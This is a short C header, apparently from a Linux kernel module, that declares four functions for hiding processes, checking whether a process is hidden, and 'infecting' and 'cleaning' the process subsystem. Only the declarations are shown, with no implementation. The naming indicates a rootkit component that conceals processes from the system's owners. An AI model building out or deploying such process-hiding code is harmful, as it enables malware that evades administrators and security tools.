#ifndef PROCESSES_H
#define PROCESSES_H

#include <linux/namei.h> // kern_path

#include "module.h"

void stealth_proc_hide(const char*, size_t length);
int stealth_proc_is_hidden(const char*);
int stealth_proc_infect(void);
int stealth_proc_clean(void);

#endif
